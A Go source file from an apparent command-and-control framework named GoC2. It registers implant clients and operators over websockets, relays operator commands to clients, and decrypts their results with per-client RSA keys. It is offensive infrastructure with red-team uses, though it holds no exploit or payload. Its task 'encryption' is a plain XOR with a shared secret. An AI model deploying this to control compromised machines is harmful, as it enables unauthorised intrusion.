package server

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"time"

	"github.com/gorilla/websocket"
	"github.com/latortuga71/GoC2/internal/data"
	"github.com/latortuga71/GoC2/internal/db"
	"github.com/latortuga71/GoC2/internal/log"
)

var ServerInterrupt chan os.Signal
var ServerDone chan interface{}
var ServerCaStarted chan interface{}
var ServerCertificateAuthority *data.CertAuthority
var ServerSharedSecret string
var ServerCertPool *x509.CertPool

func init() {
	ServerCertPool = x509.NewCertPool()
	ServerInterrupt = make(chan os.Signal)
	ServerDone = make(chan interface{})
	ServerCaStarted = make(chan interface{})
	signal.Notify(ServerInterrupt, os.Interrupt)
}
func ServerHandleTaskResult(clientUUId string, message []byte) bool {
	m := &data.Message{}
	err := json.Unmarshal(message, m)
	if err != nil {
		log.Log.Error().Msgf("Error reading task result into json %+v", err)
		return false
	}
	log.Log.Debug().Msgf("Got TaskResult From %s", clientUUId)
	// check if exists in database
	if _, ok := db.ClientsDatabase.Database[clientUUId]; !ok {
		log.Log.Error().Msgf("Failed to find client in client database!")
		return false
	}
	// decrypt now
	decrypted, err := DecryptClientPayload(m.MessageData, clientUUId)
	if err != nil {
		log.Log.Error().Msgf("Failed to decrypt client %s payload %v ", clientUUId, err)
		return false
	}
	log.Log.Debug().Msgf("Successfully decrypted client %s payload", clientUUId)
	r := &data.TaskResult{}
	err = json.Unmarshal(decrypted, r)
	if err != nil {
		log.Log.Error().Msgf("Error reading task result into json %+v", err)
		return false
	}
	//log.Log.Debug().Msgf("%s client decrypted payload %+v", clientUUId, r)
	if op, ok := db.OperatorsDatabase.Database[r.OperatorId]; ok {
		log.Log.Debug().Msg("Found Operator To Relay Result To.")
		db.OperatorsDatabase.AddOperatorTaskResult(r.OperatorId, *r)
		log.Log.Debug().Msgf("Sent result to %s\n", op.OperatorNick)
	} else {
		log.Log.Error().Msg("Failed to find operator id")
	}
	if _, ok := db.ClientsDatabase.Database[r.ClientId]; ok {
		log.Log.Debug().Msg("Found Client")
		db.ClientsDatabase.AddClientTaskResult(r.ClientId, *r)
		log.Log.Debug().Msg("Added task result to client db")
		// May Remove
		chatMsg := fmt.Sprintf("[ %s ] <_%s_>: COMPLETED TASK FROM %s", time.Now().Format(time.RFC1123), r.ClientId, r.OperatorId)
		db.OperatorsDatabase.BroadCastChatMessage([]byte(chatMsg))
		return true
	}
	log.Log.Info().Msg("Could not relay task to client, client not found!")
	return false
}

func ServerHandleTask(message []byte) bool {
	m := &data.Message{}
	err := json.Unmarshal(message, m)
	if err != nil {
		log.Log.Error().Msgf("Error reading task into json %+v", err)
		return false
	}
	t := &data.Task{}
	err = json.Unmarshal(m.MessageData, t)
	if err != nil {
		log.Log.Error().Msgf("Error reading task into json %+v", err)
		return false
	}
	if _, ok := db.ClientsDatabase.Database[t.ClientId]; ok {
		log.Log.Debug().Msg("Found Client")
		data := data.Message{
			MessageType: "Task",
			MessageData: t.ToBytes(),
		}
		ok := db.ClientsDatabase.AddClientTask(t.ClientId, *t)
		if !ok {
			log.Log.Error().Msg("Failed to add task to client database")
			return false
		}
		// encrypt task before sending.
		encryptedData, err := EncryptMessageWithSymKey(t.ToBytes(), []byte(ServerSharedSecret))
		data.MessageData = encryptedData
		if err != nil {
			log.Log.Error().Msg("Failed to encrypt task before sending to client")
			return false
		}
		ok = db.ClientsDatabase.SendTask(t.ClientId, data.ToBytes())
		if !ok {
			log.Log.Error().Msg("Failed to send task to client")
			return false
		}
		// May Remove
		chatMsg := fmt.Sprintf("[ %s ] <_%s_>: TASKED %s COMMAND -> %s", time.Now().Format(time.RFC1123), t.OperatorId, t.Command, t.ClientId)
		db.OperatorsDatabase.BroadCastChatMessage([]byte(chatMsg))
		return true
	}
	// something that sends the operator an error.
	log.Log.Info().Msg("Client Not Found!")
	return false

}

func ServerHandleOperatorCheckIn(operatorUUID string, message []byte, conn *websocket.Conn) *data.Message {
	m := &data.Message{}
	o := &data.Operator{}
	err := json.Unmarshal(message, m)
	if err != nil {
		log.Log.Error().Msgf("Error Handling CheckIn %v", err)
		return nil
	}
	err = json.Unmarshal(m.MessageData, o)
	if err != nil {
		log.Log.Error().Msgf("Error Handling Operator CheckIn %v", err)
		return nil
	}
	o.OperatorNick = operatorUUID
	o.Online = true
	ok := db.OperatorsDatabase.AddOperator(operatorUUID, *o, conn)
	if !ok {
		log.Log.Error().Msgf("Failed to add new operator %s", o.OperatorNick)
		return nil
	}
	chatMsg := fmt.Sprintf("[ %s ] <_%s_>: Joined the server.", time.Now().Format(time.RFC1123), operatorUUID)
	db.OperatorsDatabase.BroadCastChatMessage([]byte(chatMsg))
	msg := &data.Message{
		MessageType: "OperatorCheckIn",
		MessageData: o.ToBytes(),
	}
	log.Log.Debug().Msgf("Checked in new operator %s", o.OperatorNick)
	return msg
}

func ServerHandleCheckIn(clientUUID string, message []byte, clientConnection *websocket.Conn) *data.Message {
	m := &data.Message{}
	c := &data.Client{}
	err := json.Unmarshal(message, m)
	if err != nil {
		log.Log.Error().Msgf("Error Handling CheckIn %v\n", err)
		return nil
	}
	err = json.Unmarshal(m.MessageData, c)
	if err != nil {
		log.Log.Error().Msgf("Error Handling CheckIn %v\n", err)
		return nil
	}
	c.ClientId = clientUUID
	c.Online = true
	privateKey, err := GenerateRsaKeyPair()
	if err != nil {
		log.Log.Error().Msgf("Failed to generate RSA Key pair for client %v\n", err)
		return nil
	}
	// add generated RSA keys here.
	c.RsaPrivateKey = privateKey
	c.RsaPublicKey = &privateKey.PublicKey
	ok := db.ClientsDatabase.AddClient(clientUUID, *c, clientConnection)
	if !ok {
		log.Log.Error().Msgf("Failed to add client to database %v\n", err)
		return nil
	}
	chatMsg := fmt.Sprintf("[ %s ] <_%s_>: Joined the server.", time.Now().Format(time.RFC1123), clientUUID)
	db.OperatorsDatabase.BroadCastChatMessage([]byte(chatMsg))
	msg := &data.Message{
		MessageType: "CheckIn",
		MessageData: c.ToBytes(),
	}
	log.Log.Debug().Msgf("Checked in new client %s", c.ClientId)
	return msg
}

func ServerBroadCastMessage(message string) {
	log.Log.Debug().Msgf("Broadcasting Chat message %s", message)
	for _, operator := range db.OperatorsDatabase.Database {
		if operator.ChatConn == nil {
			continue
		}
		message := fmt.Sprintf("[ %s ] <_%s_>: %s", time.Now().Format(time.RFC1123), "SERVER_MESSAGE", message)
		operator.ChatConn.WriteMessage([]byte(message))
	}
}

func ServerCleanClientConnections() {
	log.Log.Debug().Msg("Cleaning Up Inactive Connections...")
	data := []byte("u there?")
	var operatorsThatLeft []string
	var clientsThatLeft []string
	for key, client := range db.ClientsDatabase.Database {
		if !client.Online {
			continue // if connection is closed ignore. else server crashes.
		}
		err := client.WSConn.WriteMessage(data)
		if err != nil {
			log.Log.Debug().Msgf("Removing %s Client From List\n", key)
			db.ClientsDatabase.DeleteConnection(key)
			log.Log.Debug().Msgf("Cant Reach Client Closing Connection: %s", err)
			db.ClientsDatabase.UpdateClientOnline(key, false)
			clientsThatLeft = append(clientsThatLeft, key)
		} else {
			log.Log.Debug().Msgf("Updated Client %s Last Seen Time.", key)
			db.ClientsDatabase.UpdateClientLastSeen(key)
		}
	}
	// Operators that left the server
	for key, operator := range db.OperatorsDatabase.Database {
		if !operator.Online {
			continue // if connection is closed ignore. else server crashes.
		}
		err := operator.Conn.WriteMessage(data)
		if err != nil {
			log.Log.Debug().Msgf("Removing %s Operator From List\n", key)
			db.OperatorsDatabase.DeleteConnection(key)
			log.Log.Debug().Msgf("Cant Reach Operator Closing Connection: %s", err)
			db.OperatorsDatabase.UpdateOnline(key, false)
			operatorsThatLeft = append(operatorsThatLeft, key)
		}
	}
	// send message about who left
	for _, operator := range db.OperatorsDatabase.Database {
		if operator.ChatConn == nil {
			continue
		}
		for i := range operatorsThatLeft {
			messsage := fmt.Sprintf("%s Left the server.", operatorsThatLeft[i])
			ServerBroadCastMessage(messsage)
		}
		for i := range clientsThatLeft {
			messsage := fmt.Sprintf("%s Left the server.", clientsThatLeft[i])
			ServerBroadCastMessage(messsage)
		}

	}
}

func GenerateRsaKeyPair() (*rsa.PrivateKey, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return nil, err
	}
	return privateKey, nil
}

func DecryptClientPayload(data []byte, clientId string) ([]byte, error) {
	length := len(data)
	step := db.ClientsDatabase.Database[clientId].RsaPublicKey.Size()
	privateKey := db.ClientsDatabase.Database[clientId].RsaPrivateKey
	var decryptedBytes []byte
	for start := 0; start < length; start += step {
		finish := start + step
		if finish > length {
			finish = length
		}
		decryptedBlock, err := rsa.DecryptOAEP(sha256.New(), nil, privateKey, data[start:finish], nil)
		if err != nil {
			log.Log.Error().Msgf("Failed to decrypt client task result")
			return nil, err
		}
		decryptedBytes = append(decryptedBytes, decryptedBlock...)
	}
	return decryptedBytes, nil
}

func EncryptMessageWithSymKey(data []byte, key []byte) ([]byte, error) {
	var output []byte
	for i := 0; i < len(data); i++ {
		output = append(output, data[i]^key[i%len(key)])
	}
	return output, nil
}

/*

	encryptedBlock, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		c.RsaPublicKey,
		data[start:finish],
		nil)

*/

/*
func ServerShutDownAllConnections() {
	for key, _ := range db.ClientsDatabase.Database {
		exitMessage := data.Message{
			MessageType: "Exit",
			MessageData: data.NewExit(0).ToBytes(),
		}
		ok := db.ClientsDatabase.SendMessage(key, exitMessage.ToBytes())
		if !ok {
			time.Sleep(time.Second * 5)
			log.Log.Debug().Msgf("Removing %s Client From List\n", key)
			db.ClientsDatabase.DeleteConnection(key)
			db.ClientsDatabase.UpdateClientOnline(key, false)
		}
	}
}
*/
